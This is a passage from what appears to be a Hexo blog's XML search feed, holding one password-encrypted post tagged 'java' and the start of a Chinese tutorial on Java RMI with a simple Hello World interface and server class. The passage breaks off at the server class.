f8a8217aee5ebd3a9429cb5eccea7a2491595809119d8531f4e2f1a00098ec3782bb554a93cf4be536ec597d902e386fa2670bf99d8bf08fa42fd5a1957ac67b84eb0ae95f4a609bff86ac21fe47f2ac867a9713541cab02b35955e78b37e2c64a566ab8e9de71da066b7017d51b958f5e53c562af4d9906dbcdb45186c58e4cd48465186805a7d7b8669c62d44b501305fb7e898ddfa724ea32b409bffe81f6d04b02847d87605349ecffacc2ab4f87459c7dcf95295437b29ae996d908413f090c229fb6215b52a5f7cc2e163a061dbc03ffa8c8a5274d996da8144b62fc2a8f59c42469321e5ae8ec30123cecd0a6ae9103ad56652914fd292ff29e256a6fe5dc5da00ed2f9ff097ae73fc52c4eaaebccec4e8e5827b3a5c8bbf40c901f1ae45330197ecd9a93944a1dae8ceb3ba4ab7502a0669b5cc461f46748903b0576b5c8e983a8c2f2b4fc6d3bdda874154553852b41189a3bc6ce5b7067989b83b617568ed0cdaa32d1aa18a33513d759ea64fd7a63a358876b72aa7861a8826c3b8fa5c80bac2a40ddcbfdc1605a10a04fdaa7734ac1fb91f8403133de17bb98e039cf40a8a0c5098d6528bf2ec66a7ee54bcb3c56d46954c451161d1bfd7dfe6255dd8217a52e3194e2386d27c8c193a53814c6345a386e3793f53471d902bbf324ceade4ca73033d2f0d1f97ff0dbe70d0b4275c50ba0b1b6224d728e0f2b90cba04f67726a4c6416feb08272055c633cec08cf7040bf91d47c7d687520926ec01a4696d620b931170d2bb4d49f8c77b450cc65f0ece39d11781245bfdc520c6293eb90fd576104c1c53e097240f1818dbb9a851c79c03ad10e3e29aa09a122c16b1c1dd644f7ba24503363ba64015fb9018bd491a0da3bee43f7bcaec03cf19c6b1a51248f6ef2a939e33cac8fce3eb63f241999e8e939cef162c65f95fabfda0f62d84b8a7a6c7019d5eb9987a258e834b4107b84ff87dcde0698cf104d641dac9343b384ca5b3ab02cdc1392878601f50cf01db2f300f3307636a4142b80ea9c9ef73c0ce27191e14645b6f0bfa05c78e901466ed87b16040f710d8caf856e308a450d3e7e0f93e9b67057fbeac92faed452ba0ab67533afb05e2348dbefbbcdd06c07029c161c5be69e6f70d4f46c1337646d8f2c922bbf7fcdf8f5912d7fc007a8e7b7c7e7c073aa1e671efd5806dfb0f7005da539f84a6b246b283a73ffa78a8b653138809e77fbfd8c7d99aba74391803c70a5d4a2db5bd8d4f258f5a1a4e18b49da17d959be3fc57adde63a5fe9cb5183d9810198c0106be6006f19704b831bc8cde80eafc9ab9d4e0349b71e1ad6b0ed92696f3dc6c4cd682c7964087df70666703933ad7207ceb36c766b4937ad9c84a112827d7277761d5c53faf20d8bb1f886683213bd210aa3ce9d98ea0cd5c5e98ade59d1ecdef3b6efc5fb745561702deeeba3a68212b658327adc4a78eca4fe958c6c45386bfb8eccc425ed54b5d99aece4cfce3c1cdded4a363366e8f43eefdc6f3ed37a5b2db1c00f98393294f2c45b91b975a878b7d7a6165e64d641065e772636f9757c92c8c8427536d2e09323ee4d28304d78beeaa8c6729431efde2f460879140a984e95b8e2129e49715afa58664d921956318aa4e9ea3e03af2d4fb13608a9c7b2b256d4f53286264410f21730a82ee002ef7ef1db146da1221eaf8463903913eb7d1000e1039d3301f48d10bd97e13285f8dab3cd5f88c4e57d9b9a585d77f53a4266cd58c486096b6037e3cc2236d3ac47760fc7303c65a50e6c47bc9db64765bb2a6770ce1f29d0d326294509e85eed20758e3051a008adadd74ba3425383da02dc9834bcadff18e462fd0b88e2f25ca51d08a781bc7abd4c029a9d631df1057ac3ec4b8f163858afd03b4a64855d7093ade174a7c7be6fe6049295d4d8c024fd298f8db6dbc07fffaed5a9b7f98289a5b391d1eb6b3ee2903fb3924f3421bd9c1b77458ef29d2637dd7972bcf455f81a55f30b4f41989a61524b74f89a8fff5c3d25ddfdf0651c64f7ea7421243a61e065d8ab82cb84831a9ff4e398d097bfc1790082d1db1aadfa5cccad0ee26972cbae209f689f178ea03b1fa5134fa2556914ede378177c648f6377e1fd62cd3db2dd7bf6e0af3fc660cc1afb8175dfd85ee8c51414cea84571fb86fff0f9dfb49434f1f20154ce1e90ede599d1181cbc05ff2e331b005fa2d454947d3c5f9d20db3b7313a8fe1be5ca0811e4e2ece70878ca7bfea22f35b2a2f031498e1487a12db485f5cd285afac7b0d4c4e19b32e2a60d6be049ff6ba42e00296750ad72907c7bfb91f88d58a8a74b1140987e4ca1980d6912c90cd5205fd69dcf64249027d3394fd481e7d7b2141ba614896f6309a036005ac92edef9a5020535f3a0dd4d16cdc8f19a461c0c2ef9b4b9e80a07fb18bf297a69098a780a34c6f8794d6755e66f4b50c1be3d13c8c9c24bfccde0c410646a9fbf94986fdeeefeaa678ec0462f0db6a92cffefb167ed2daffd83e1d33b53c1aba199678e76919005d221c10b8d97245262019498a8d38ffcdb65439455fc3883eb4f19bf003ffc48b7160e28ba24074174bca88cad647049b634d4aac37d5d435ed8af966cbe82d3725c6074b3fa7974c8b71d38b7ebddf23cde7ddac0724ba737dec397881ec29b609599bce27be3e6a3ac5022ccbae1006e0e372945356e2fb2f7787f58653643c024b84beabc1f3fbd96c0b6121e67ab39ee0910f277c254138c2a8593ac06855e7c6193211b14468e66c776a641a4002a586cae9b517f7b3ed8199d26132f16be6e3dcd3fd709ee7d5e14ae3eca0d0e715342a62089ad89b2c7ec6a4c3aaa6741fb2406ebc90886784f82cfc04e956bbd6a9c9b304047f6e6649f613c28971ee875117f00d03a9510f707e3604e9ffc8ea775701a88de49d3c4d28424c60bc2acfd9301883776bb44d717fb813a91f22d9c5bec257367f9ea21dc916cc5e2359825af38291a3bd4c48c14e7eaa9c4ac6be6e7d915696d03e2f5b31c54b6bb69546fc0dc52f093f18b408e8ea6ada471f3b45744d5499f5320d7325e8851798a6d61907b63e0462762ec40e33166a5e9e22a0ed8c3d51bd2cbca5209baba202645318867cdbc837dee220ac88e37e76a57332f701463a2d7ac2a810349ecbbaba2ca61fb150e44e37322b37e4187a5160eacc17f4aeb6eff9270cc8232ef8c40f406f7c2c8c8d824323dd76d244b377c6aa42690707cd61be91ebb76b70af85c10e21513c9dcace9daae0fb176ca00a59ffba1a600019f1f2dc1712161a62f37aa100ba0bf68b59ab93113e4b132cd2ea88ced679c6bbcdff1c13b3a3ce8cbe317d74d18c8e138d2cfb8c50f80337f2e9d7549a7c8ce06cfea1666281f1d689e81ea6a3803dc626be23248eeab22576147a145ef8d6604c8b15fb41073a89993380cbfc61277fb913eb62c7cee5fc962698e78cc20c353454f4c9b1cb66dca97e1c59ef41607a40a7946b46cde8977b1621a981aeadcf29c667f72e04d2295a171e67f195b515ae374be464c5dbc10e1edffeaddfcaf7b0a2c4ca2612b1551d6922bed09d9864995e083bb66576905b3a722a86cca3cac5b114840f35dfd59e7c05338a70836c24af924833c79e26097c729389096441bada3a6ac06e85fc74b0883ba971f3dbbdd19844a50e1be603e1f018cd3a316b8e9bfa1ab5445e7f13d58aa3ed27c58d41a6d937122908f8fdf79255ae7431bff38c8979728f3147fc3a775cb1b93e476eb61ae161300b38cdca26a7c0c2360e1ac00122eb9d1d4795dbf2f8632c74173321f2575794ecd619d0cc1fc45723c9468ab8456c861a7c54d70eece3a8dbc09943e8c3fa7ef08fff99e27a0bf519c8d632ac331c313100457b32d89e0551efdfd026e4f2a345683c65381c62d7bcb38ace09d9166f690ecacc430ff61d74d828201de439b0db946b3f27380065c151b5acafdbaf9e33976caa92527dde6a50ec12d6541ffe9248ec3dc514bc5c7eba40f56fcd2d97c34fc515bfd7d28ce8a52e0816fe45e282f6a2108155320474968d9fc6168fa79d6ae83855578131ee5f8d4cad2129cfbf3b7f3c3e0a74962578869cb9d22c294a66b9d6bd12565c266f1d30f18ad5d490dfc544ce22f8cb6ff307166e7d8572f579a41b54c76428b13deebc562acf050b5e18e825a9f05f43f189e568cf636e0c5bd168ae421030db172b97221c0a7e0f6610d8c0e5ec62005f520e1ab6f94edac0e5f0ddf5eda1f57535ee41a4f47ac689800f20878e74f1bf0fa22b9e4615b83b3e00b0899d792147fd7fac796c7daccc74470e79afb6723f35eec5eabbfb5bc3b565935c1fe4f329767269b145fb9a6f97486a92046a59389fa05a4e71e96d2ba5db8af3044b4bed1f13e8e7ee2ab1625a435f3b6ae009df705f64774f25c80cd3b5d908caaf4becbbb4da0701245046a83cfb11906a8f10f873f458670a6ca8e75ab8cd1408d19aeac95f3ec8a179415bc3a7c889d6ec3d72d724b2e064a7fd7440cab38eaa0d340483e039295ad0d59d82f9bc975ce87bd8a65b44367e66ff56978418c105d9c05c22d26262d970a7e44a0584cc8d300edada9bfc2265a44093cef093690e1c78d19c3bd669f7b03bdc1bcb56dec21c9affc17f5714ed79172fcdd0e789af7e9cd271a4f99678bd612efde26aa66b4916b79c9bee9a3cf4729dea62c3252b3c0a48317ca8fc0dea9c24c7c489afb27130016be0f3a9f00b05795bd3d4cff8635deac738fee7dd49da7732ce737caf6468bfbcd05a85ee243ead7762d4022e30efe013bf69239e74f566c8c250d2aa76a28bc538fb5dc1ba2410effb33842a3c1508427bfe6f98bbc99c2e2f2bf72a5ca27c69c40611b6ee462bf437296d06f6a2324be2a00abbc21204ebd736310d67d8cf8fa68b28cf6c0478c435cf6be507028647cbbaeeb492edc4e865e1e8523dd99edf3ab79b3beb4f4ae723035e9fa791c6cf939cff0b00a16e81763cfb68216547498c056fc1b48530fd78f0491843d46209de5bea903519ab626a48eb1b13553c58fdd5bab50314459383933bcc981499b0131ceffe7d719ed842cca9aeabdac92acb985e469c552d646e6d4e6214b183d9a6320e83897b1a4de34cfb8afe95a95344741827e3ddb786b1dc9327e3d35089813547bba0b8bbd9054f34035be62557cc47b4a988ba0155a3ac96e10fe556d8908a7c52e5ad99270c82e991f09317d508d6f2c8cc9b69672424504bea60eec9b85a0f0e25d81bfd27c0dabc72366ac0b4b984c2667278302ba172ada6e5069734520ae5b162818ac9274b0954777d31ab63e23b1a23715d1019c39941f2fc35a55cd5fd7e9d420dedbb5fda1baf1571b6c8ff07ad716fb1998fb0b625accb5c16b5732b458acf51e8dd94251fe8e606ac232e28c67fb2eb9ca10915a28a03fbb2f79de125a6f5e9705663b337d1084bfd8aaf5ee8414c9b15a64c0e8dd548f295da84816c3527d321fe07c4a568e7d835451cd5203c2c1b46adb274f23e9d6617b4abf195358a5fa7eb27c10bd3a7c38a64db02b2a1e32fac51bba675cb97a79b80cbd9dce760570c0cfbfd7577f18caef5f1434bbd43a06ab7750589eae597bf4cf721d05597408c114d6c46dcac93ec9537bc8cecac90c96b969bc08d88c8adf752f3b961cfa7ca780460d41a8ef1f9f953c5ce35f61bbaa76cb8e922ea99940b512b276d9e5a83f05879e98bcaf6b14212a9095a0e051872930d373cb31fa06f82e3e79a5c9e2a6e163a1e17e7384a180297062a0401c98ab646cde9ee7f2245be6973487cc348fb2afe603bcbd27cb0a59ee0779ef42bbb57265a22c3e522ecd04713449de762699970151a5d51d01fea66983526565760237adccea6f463b163fca4fc1e3f368c2f1a092f39e64181c289dd18ea4f2b7a180b15cfa8f733bd07b373a531eac04c35e6174a261911a694791f6250fb7a0cb0c82a7cd49b088d41811d30da06b0e319caa6f27c3bfe505053efe38e185d01e369bf71bbfa67bd53186883bb76ce7d65075f4fbb58d9006bd91173061202f5142679f82db800902b39e1225447353f8cd3ff2c821b19f1e231addc7c68068f3702370a623a320e84c6e72f1e9b1d9839528537649a17e785252f9b926e5eb1377debf554039ab524d6594ef950760c14e9455b27137d2a30b13eec13851ab58e6f65b1368eddabccb912fb0658cf9c66596949e28ab8d45e92d2dda161987b21c520edeee62c035132fe831ed389982e65f2f7ebaf5f65910e228c2ae68fcb999de600d9ff5843e75db043a88bedc5e886d157d7dd705ee7cd1e9d6c92e5c33b1e1dceb4891fcaa3a6bacc68e7ccbb5dc92f279834f07bbbb448cb00ed582e96e460cc5f2dc05c41e135205fea1b80b4e672872f7952691f2f857367a4664daa41de0b67ef4c097288fc8681604368ab17d00933c9425c7a7b46f68b6778203747b75657cc2c07163159ba057eefd498823729418ff4efd1fa132b18f8e718a57a3091714888b5452bd789deef84a58ddfa221f20e1706e7948ae2cf008dcacdeb4444e334bcb152784f87edbc5b112f8d2b2e8768555817f75f45fb83d5c8251455bbfa0a26a629d7533fdb1441335c6e03ccdb97019ae98e05b64a7866a518349de49597bbc58c803cc7381ee34bd0e5d360d0b3cb3649e32d6625d3126057782923e0a5f503c5e645aa08706d9ba3b818758581eb93d062ed0dd89d8e130c2227ca077b4cd48a90f4b24c695644854d5c30c783a5dda670b067fb3b027714367ec8f6c0966de90f0af9bb575df13ba209c1f2898b27241216d6064840e6964cbd58602fb0911a18f2e9bfe73c7c80e2e962ce8c86a6a6c199bcd3da205abe2c86c95df8c3ef7224f9710ef0067b5ea54ccf615e7d06fb0c2b1f0d50a5dfa46f33fa1f3ba753e576245cce4af8a21d55efa4d9c4c01befb63dcf0447358dd291d08f6ba16094bd889e1bca17204bb0d3a706324bcd275275b03b1e6d45e11957df7153d1c30a812819ebbfe11babff37f2c1c87699f5cd450fe66b132efe191118267b4ce63242e8cf6ed56d135ac1aa7fba7ae5c3065d053d9e71a259c41c6ba6fa30642297139bff6034cccef7985d58c362860e0cff6bec154740a13e91b85bab56a301f75840e50525e809208058674be6ffd5e258b4bb6f4a84b1826b88d5b2f94519cd9b4ee96d0caa17237f6b92b1989a93b4a92c455ff68e8af5054dfb352719651e446b3204393bbf1b6401b652cff46c900e83b7b872f6e6bf0a3ab456676b499693e234e569d2db24b0da75ebe8af3c8f2e1c6b4f239adc2e867d956ce657432ffcfd9f5284c709c3ee4a84db2b415288d4d39477189a93b454b30ead15f10486de0b5cfbfb0e95ae26269892cb085298bf2b843cfed1cc7038aac96c3f3ce2a32bea37416ef9386987021691eb6a9605c514bb3acff22381b52275b708c652a191e10e9917b24d5f895f2a9d223dd2db41e839460bf010cedb791ac88a558855a1888e3cd5186a06a7fd6988c93414e880af7c3f3bef72a74e297c7562b59f0c01b1bdf4c69007419b306c9c1f578420f93d387284db6136a362c04c3d228204bbe6ee50977ca402fde9a5128713c7391f3b8f2bede0a5133f1fe5890761bae8b86a1d86355a590595f626309be23777ba6bae9fdda323ee142f9f17e2fd28f86a7e0eede8abfc67123eb1b3ba28ea10d5ced70189e6294172a42e9dba2e36ce3fc7691b3b6f0053a210d071aec3cbf9981efd773185b818e6169a8661bb9e955452064711e3e8e188a490bb3db8b49e0617bbea833ec0436beed1f0c1776b0d1852a469fff563720659ec3c011657b601f23b5cb0a0f45bb45fe246e3468ed116fcbe889269e807dd8dd524851ed0cb28f528151e98b937465b2b9c9867a057231327aa608ad94ade4ac1af4f8506e8e9d0b03a555122a60025e6bf3df720c9d0b2a8e6eca20b0a45670416b76db9f70c7fe6831ca4cf1f1eb515e8de8425b8ad5b4bf8b95341c978a36299274ccfcaefe2f49931c001281fa42e12fb80809e0eac8ef3133a378016101291f773bc8580dcab56b1de70d0b02368e1bd94d4cb19be24d936bce83c7e541722da013180f0465119b30e4b81623f25a7fcf9b06ad79050e0a129e21c439736fbc00d742a138a3f66670619eb7ecbd6638f601e2250b9674e9d87edbf48ecc468f9438c3efd5fdd4411dccea1c18881dbc481986509a26a7592ba26721a7e37e52499c50f09e19937dd8d2f84c9cb39c06b3b278707ba365c4e266120c0e18454b1afb8a9bd060d542c246998dd1a546e6e3fdc7324550d105470c0224eb19b4678a4f26d684b3f4885ad79439f7cc335df72b9dc4693c3a504194920c19a2e411dc357ce0f4e8ef72d1c733e7982e4650664378cd97461b4d017c9c7b5627c49e63a6be7d7292e70e5ebb2b05d4b9db283f304be4e70852c6250ea5a20d2d4fda8d05fb23e9d1bf05870351d3ee978c2c7595510799a0141684f38f320433c8406d50d53e0ae61c70eebfdb3e261f5880c29ca1b73ebef4e32f008931098bf8929063634f1f417533d82358ed51047b923217b36005ec326642482804330b20f55c54429bd4fd2230b527e1d54c588a06ffdf2f9778fc866bb44f413c6cac42f8fd094af6001c94b1256466766c765ffc7a7c3098bd4edd8b4cd3628adba19385c3f1e3a9a8288ea070a186d4e72852a32e2576c7ce4a153632286be6ffcbf76003fa60dd9dd96cb3ba299b03439ba4c0d85f8feba567f993b9b458d02e3761bc8224973d379c00348fee0b60a42fa634cf3140ce4332338e2e3bb891ffb08e2e15123cc7257970add8945ff51864c3578dd806a80c13c33476597ce678a25e520036839dbe1ca353da469a787e2321f38b3a9e9c483d37f5e7dcff94a72b992255f2d5fa8ee2e36f403dd776a4ccdee987b31a733c8ebfb21fec45f5eb587c2be72ae0f37f1912c2e497ce9535d24a9533531590f0dd79b0dcb920b608a79df2765834ce047c1b28ce49614abf9bd360b06040a2e0e6b93082c8cf5258d43e04aab1123d59d797323ff4bd8590836bbc671eea04f8fcde54a91f55e90c06113182ab96844f518d4971f97877a7f4f5ced7c6730462b72988cec0d8eacc3f70524bc3545bd25e82323f4ef62bc76fa4b88730afd218d0fc5040552506c624446300b09aecacb8a81cf1ac72d2030c950b9b6e600838d2dc4309a1efe11de0b4b4dc90b354fd8afda9660e471bfdd6669b521559c7023089d9044b9de6a37ceccbd98ed3043fa3c2c7cea94673903838a916e806818bf658adc5b387387169e1279cb626763c5a2fe6480a3ad11da908180cb60df81b0c7e4311b780e8ae77f4e399cb4fcd400ad7e5b652ee16e962782436070cda933ad30df49e29689eabeaaa45e8c85890a13b73b1bdd1859e50e6347d5c55c2a9aba808fd5aece977407c88373d661c90100962140bcdacfba9a242fb4846f3f50466965274fe18b7e94955c981fe4db611ad48fceb14b927738909448258db2c1ece169ed9fdd0e89c01c252b4434082f55afe9ccdbfa751f899a69b00548c8ec7106d2c9bb53874ea58997218456432102c85309e448e148d9913c969a9978fdaf2336c623109630a2cf0c0f23a181590419873d6d45d1885ee5647f8f43eaedcbfab20978dc8e20a46dda413db38d23157cee71af41bd895605efc97d4418c71f9b615291628d4e075302d9f0a772a596c39c8988d14b234352a16920363185d4b25a129ae5cab8a50d508a80817a82cb9111e0100dfd351efca84a1c13fa9b05080c3733a465660b02afbd6cf571e8a378b183f7e801ac51c7cc69c02f4b345ae7ca41d866e739565814507420a3869aecbf6cea90651cd187d95fd0867a4c62f2f1d4cd606637b3fcc0464d7fa35ff38529b750a72ee72402ed722b9e122293067482547c31cc6f3b997d7cab22d11508a7391337d29e4119236a4ecf0ca99d030921b0cf1b6ba6171a5934dc6b76edf8accc5b9f88b1ce8851cedec127f1cad66cff3d425691246876bd2fc641693b4e66313efda3f4cefa4f43290496cf5635b21865b6e8469632262e5ec10db6ff65cd9d5e69c36c936e1b67228b20d2b518ddf0e22822975556bb2fe805a4f0fb5da1a9c254d5bd54e80ef4a58ed9413829225fd8be95b918cb2496ae7b3befb1eb16333281ae740a5706e45394b899472d7c6fff4e0a6b148a6748f8edb8043500f953e1dc82bfb51466862e26c1ffc456f28f1a81ba565d19d0d245f7d556adddcade205443dd99ce5ee8819c99e03e0cbd1775416ad9026d2b9e22d01ddd32a64a11fb0ba2009ff5c2382e6f08d787335ea764673574b70f269a19c000f53d3f8a9b11bb3a57d3034a57a3ca27056aeadbd34a922bfc8529ea34aef31175c3269303e094b5b819647852a3593eff48d300dcfcf5432d70f5a7b74bc1aaed617ddaee34393f9ae01244427a33fb9fd2ae2f775db46c9d7ae4882b9abcfe4d59673cc1fdac21473ac8dd379aaeb6c22ba3c5f734625d1132421d786e92da7fd1ea841997e03d66ecbe632f14398b475dbb5735dcf918faed7a185a3dd7b6c7c00c46b33f9e976cffd3b96e7c78b1b70e7b9e0e66a72135ad365f73b6edceec0d772467a5426472ceb2f3a6de80db1ae0a6feb460ee5bcdea5d4b17b05c733944edd3dbb605a3c0d7c1882eceb2ea68ccb071b9397c2e8ca48dbf161d3a74eb7cd24e5dca36bd05fe54da33847c01b8c243d45bc1a2275e02cb26cc3e3f5ef71f70879c3dc444c201b7b969ab39ff48393112a0759119e5787df159357049887e4b665ee638107161c8f2eaae6e98897f6aa257f4400dca5f7edee3262ff4414e47c22d1636f3b1cef259edd4258150b6f96b10361bb34309c24aed6dde93474fb462b849c849217a1cba674e03ae249e406cdc2c848b1ce59ccf346cabfc3f3c28c465073ee9319d3975a14c37b5353e92115ce91cb0e3ef40553be804a361b8f5e2886d0069777a2762cca1df6bee7e8ad547f6b01a5cc451fd3855e3e995d5320c7e57518754a7b3b3ac21d0f4cb4b1d71ee25bad0a5f7af0c8eefd78a9e8c0d3c60cde364ed3b1cf439ecb71707f3f6fb661d3ecbd19abbfcc4fbe2f232a5d6b6d42b06f16a8e3e040d6869a9661fa588fda9d595129ba23f386b8eefc173f0433ebd1350f36cb80e1843f78670bc565859a7760034dfcdf9a794a54dcec9ac58a81f9e051f12404bcdee9e16d953a33fc2def62f99b06690007722daf6dbe1d4249eae65a965149334d642ef74279820ef96f5b4bd5450d55260ed97226843ca5cb5ccd0f7c48fee4ee3e6199d95d477a806cf0f270f06b185b016aef2d0cb77b7b5017fc70ad29db86611d23a04f02f75c2f342136e7dc682dd55091545996ed513a1c986629fd1a916d01daf12a920dcc2755ba94b7ca3463973a7180937b15b3703b1b303a70f07bd153191c87048eeaa57a91f149ddc382cbb1fff5089e9436b760c4d3bfea8272783983c4575c206c72ef3873c3d07aac54b15970cfafd09ca04e9f29c7294b1775cfaa7c3ff4388eff84eedbda3ef6971efe37bb73c40950e3d10c7139b2956e4e05ffd73714242e82cffa35f46d8136d76ccf559a75a947682e945547c35a5a96795ebcdbae592c398328a0d02c84dd587b61ee82407903d77f5ccd9448498ef3ee8c371b2687a0dfcd8f3ca50296994beea9b8065babd92896163672ef152c486a768c9086f4e9aa5db1ac43fdccd4442faf4fe416c610544faeb058d84781e43b639766e1d6540c35ce8442e0a8eac4bfcab7fd095b1ad2d5e534d615e4933b5c1d1a97c5e43c516c02b18fb7671ef6296a4309db841e4deede24d258cff859d5891767f867295e6f9dd5d0dd1652b0b0210303d66aec344a86da3996d9c85409c3cf1b81f07da932ff5b78203fc982e10f6fce5dc02c320647687166463febcfbcca610e2c113ee0bb54a026da6b995fa53db032513ac8c7c6fab0ba780d1d351a80779e66daa88739cdd20a980256212ed3cd385026dd8ec90ac157604276cf155d484e3c9e1bd744893bb44d6316788cae7ae05144af79e8a850ff13266b18dc935fe376728f4e9b1270c556d043fa20819e7a513f01107bd0a2bac546aad41e50797aa756da640330762a5351a3f1532d75d449a4175d80cfe8d5f59ce25be44b1af56317b882418f0eb79ad5430c29ca9785e15b62acde69326766e0e84a0eeafb008f22186279d89d5f0f8bdabc472c3d4b3121aeb4a9ec9bf61eb13bd490122afcad99d7c1f604868fcf9148f69224a873c5235fd0ab2d9249fb7130a955b688cbe97796a945f07891612453a2d5f14e088f3d7d7a55d58e02d9a97377f937ee8472e67dd8fb4dd19644a8402bf4b84dc1a909539ef86ab2ff4f81271f354cd5856b509cd923747efb33564cdab49843a152d61a6ba8bf23f823cfcde09b29f2f4b27d1ecef4781c0183ec8bbf56bec70417f7931c45706806a1c4effbe7c7c173de51c8abffb54899fbb325502ce3a23f309e844bcca1d08e0f7fd5cea5e4fb5e27f99b5808b50d4b192453281ac28b8a5e0102d09c30a841f0d9e385efd8e2bd8e3167ed9fe4b9883051b59c37a29d8a888cce4d81010c3d47e5b0d62d848d7202f608a9b805da9f162090c4d40d9ea2eb392285c04fcf99fa0e7523775c48305720b9efb0f43b192e3da8bebceebea6a30b2f2fe9e1f5409634179aaef478b32afd284bddc23493c584cec510fdb257c11bf3fe0129cfc5a9b621790af3f26aedaf81dd5a9e2436ed0ecab820f77bf8e1687bc1e29483dbb8e62a45d355c140767aa39fdb969e05b497f7588879e79a056478e1b0a1fa1a3a81253334f2997c08e0ce3106c5f39a2894530b6182e9e56c6dc925ca819f6ff534780724aa2a86a119833b9fedc840ccf5e624d07656efa2105e7f82ba988a0e5ade1c4d53265ea0684f8e7b8a07e21b369d7234e6f1aeb5ba63adb118affeed25f06bf467225df29e9598e1c3a1df490c1c20d52491ededa45d609cfcfed2a317c38801feb9b76ad8b8b228ec500cbe4b6b54ca0d501b0d10f60346e330b83cbb6f2926458ccd2dad1ded64c94c82c0dc3a6220fa990c51ff022659045b0ff492c9984abf0d623cb708c1424b93d7ebc9ccaa36c5a737cdcf4bcc7bcc1f8c7bb91bfe898f539a5897f63c0136d332fdc58092030dfe086dc9f571dc2ffc2e479a61c96f4d7cccde19c991e2febdb17402295a7dc544872980da5b715111e0404d3ed85ce7923a30095807bdb2bf91699bbdc0210b182733d1e01f9fb90df9d8f2e60517570b552fa214f26feb67cd86e541aab5cc311ecda08afbbbaf8dd4b866b744fafd49309d551bc971b097492c02d285ba5d044c953d1d41b223141b5e45c8dbf793b3c8d697ab78119069feacafdcfc14e33accdeeea4b2db3d30b737b7162d47e5a163db1b6f71707eb7dd504f0785508b5b8aa45d428dc3de64eb10df217245fd5d9b923ad4ef8ddc0ab03440caf886eca47fd4449860d0728489bb3451af0adc4a59ef60cc25f07675dcdb4b6d464c48fc22f131f13135821e867b4d437cd00140d432e33234199fa995efd7b50c1b6a18c95aef84eb3ce93b872ed5e410f208dc6268204b034527ae14c7f0a3a0e8bed6b5f91ce406a557ea74ae4222889b2aef62bc82336a6c8fdd5a4ae239d8b55026e976af03fd139a499a643a2f4e747e0e438f5f4f2d0bd5fb794b38bed7789c6e41a752293607b59f5ad6eb3e59ef48d9e7c69e123cabf27951352ddeee1ada101166d0ff64bb3ed6b487fcbcc6c0e8a6919c0e0498c7ca5d7853e99a0af7c6535c6db3f6cd0d260c454c2c9c542676c88ea27f9aa2f76c0c60c94948d035325461e16ce084ce74af1dca6d993f3730e3905bbebc6ef02005e2e333cf89fad3b350ffbb4f6f74dba144d888b25225f7d8c9bebb797b0568c3aa1710d9da5adf36efa5482538bad5b40f0bd09326ae5cf94ed22718f0e89f16f9aeccaa613aca81429e3cfeeba61ef0d4c7f40c3eb324849eb206cd0773e0f83fa64bc76dccec48c8fe44256b1205cb8fcd3171f1b970fd06d75798d76c8a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMI</title>
      <link href="/p/daaeebb0.html"/>
      <url>/p/daaeebb0.html</url>
      
        <content type="html"><![CDATA[<p>RMI: 远程方法调用(Remote Method Invocation)，用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟上中的对象的方法。</p><h1 id="RMIDemo"><a href="#RMIDemo" class="headerlink" title="RMIDemo"></a>RMIDemo</h1><h2 id="服务端组成的三个部分"><a href="#服务端组成的三个部分" class="headerlink" title="服务端组成的三个部分"></a>服务端组成的三个部分</h2><p>创建一个继承<code>java.rmi.Remote</code>的接口(<code>RMIInterface</code>)，定义需要远程调用的函数(<code>HelloWorld()</code>)</p><p>一个实现此接口的类(<code>RemoteHelloWorld</code>)，在服务端实现接口定义的代码。</p><p>一个主类(<code>RMIServer</code>)用于创建<code>Registry</code>，绑定类示例</p><h3 id="RMIInterface"><a href="#RMIInterface" class="headerlink" title="RMIInterface"></a>RMIInterface</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">RMIInterface</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">HelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="RemoteHelloWorld"><a href="#RemoteHelloWorld" class="headerlink" title="RemoteHelloWorld"></a>RemoteHelloWorld</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">RMIInterface</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">HelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;HelloWorld&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="RMIServer"><a href="#RMIServer" class="headerlink" 